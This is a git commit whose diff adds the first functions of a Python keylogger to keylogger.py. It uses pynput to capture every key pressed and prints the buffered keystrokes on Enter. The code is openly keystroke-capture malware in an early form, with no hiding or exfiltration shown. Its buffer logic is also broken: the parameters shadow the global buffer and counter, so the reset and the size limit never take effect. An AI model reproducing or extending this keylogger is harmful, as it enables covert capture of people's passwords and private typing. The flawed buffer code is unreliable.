f38601e87034b5611fc47a8e589534765794380f
Tarcísio Marinho <tarcisio_marinho09@hotmail.com>
2019-07-29 18:23:08 -0300

    first keylogger functions

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,26 @@
 from pynput import keyboard
-
+import pynput
 # https://github.com/moses-palmer/pynput/issues/20
 
-def write_to_buffer(key):
-    print(key)
+buffer = []
+buffer_size = 0
+
+
+def write_to_buffer(key, buffer, buffer_size):
+    if(buffer_size == 1024 or key == pynput.keyboard.Key.enter):
+        buffer.append("\n")
+        print(''.join(buffer))
+        buffer = []
+    else:
+        if(key == pynput.keyboard.Key.space):
+            buffer.append(" ")
+        else:
+            buffer.append(str(key).replace("'", ""))
+
+    buffer_size += 1
 
 def on_press(key):
-    write_to_buffer(key)
+    write_to_buffer(key, buffer, buffer_size)
 
 def on_release(key):
     pass
